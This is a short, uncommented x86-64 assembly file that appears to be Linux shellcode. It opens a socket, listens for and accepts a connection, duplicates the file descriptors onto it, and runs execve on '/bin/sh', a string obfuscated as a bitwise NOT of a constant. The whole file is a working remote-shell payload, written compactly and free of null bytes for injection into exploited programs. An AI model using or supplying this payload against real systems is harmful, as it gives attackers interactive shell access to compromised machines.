global _start
section .text

_start:
	push 0x1
	push 0x2
	push 0x29
	pop rax
	pop rdi
	pop rsi
	cdq
	syscall

	dec esi
	xchg eax, edi
	add al, 0x30
	syscall 

	add al, 0x2b
	syscall 

	xchg eax, edi
loop:
	dec    eax
	mov sil, 0x21
	xchg eax, esi	
	syscall 
	jne    loop

	mov rbx, 0xff978cd091969dd0
	not rbx
	push   rbx
	mov rdi, rsp
	add al, 0x3b
	syscall 